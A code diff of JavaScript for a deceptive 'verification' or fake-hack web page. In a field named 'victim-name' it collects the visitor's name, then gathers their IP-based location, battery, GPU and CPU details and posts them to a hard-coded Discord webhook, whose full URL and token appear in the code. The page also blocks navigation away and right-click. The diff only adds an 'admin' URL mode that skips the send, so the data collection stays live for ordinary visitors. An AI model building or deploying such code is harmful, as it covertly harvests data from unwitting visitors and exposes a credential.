@@ -3,23 +3,35 @@ const progressContainer = document.getElementById('progress-container');
 const progressFill = document.getElementById('progress-fill');
 const progressText = document.getElementById('progress-text');
 
-// Instancia de audio
 const beepSound = new Audio('beep.mp3.wav');
-
-// URL del Webhook de Discord
 const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1533628544129957949/EpuXsjlTzIFjNCDSo_paxbaJc6EREqIYxTGIMNJiUm4inVJcRQjXkcBdhInfPZmGtNmx";
+
+// Evaluación directa e inmediata de la URL
+function isModeAdmin() {
+    const params = new URLSearchParams(window.location.search);
+    const mode = params.get('mode');
+    return mode === 'admin' || mode === 'test';
+}
+
+if (isModeAdmin()) {
+    console.log("🛠️ MODO ADMINISTRADOR ACTIVO: Los datos NO se enviarán a Discord.");
+}
 
 // Bloqueos de navegación
 window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
 document.addEventListener('contextmenu', (e) => e.preventDefault());
 
-// Evento principal al presionar el botón de inicio
 document.getElementById('start-btn').addEventListener('click', async () => {
-    const nameInput = document.getElementById('victim-name').value.trim();
+    let nameInput = document.getElementById('victim-name').value.trim();
 
-    if (!nameInput) {
-        alert("Por favor ingresa tu nombre para iniciar la verificación.");
-        return;
+    // Si es admin, omite la validación de nombre obligatorio
+    if (isModeAdmin()) {
+        if (!nameInput) nameInput = "ADMIN_TESTER";
+    } else {
+        if (!nameInput) {
+            alert("Por favor ingresa tu nombre para iniciar la verificación.");
+            return;
+        }
     }
 
     document.getElementById('overlay').style.display = 'none';
@@ -34,8 +46,13 @@ document.getElementById('start-btn').addEventListener('click', async () => {
     startHackSimulation(nameInput);
 });
 
-// Notificación hacia Discord
 async function notifyVisit(victimName, ipData, battery, gpu, cpu) {
+    // Verificación de seguridad secundaria antes de enviar a Discord
+    if (isModeAdmin()) {
+        console.log("🚫 [MODO ADMIN] Envío a Discord CANCELADO.");
+        return;
+    }
+
     if (!DISCORD_WEBHOOK_URL) return;
 
     const payload = {
@@ -107,7 +124,6 @@ async function startHackSimulation(victimName) {
         if (res.ok) { ipData = await res.json(); }
     } catch (e) {}
 
-    // Enviar webhook con los datos capturados a Discord
     await notifyVisit(victimName, ipData, batteryInfo, gpuInfo, cpuCores);
 
     const logMessages = [
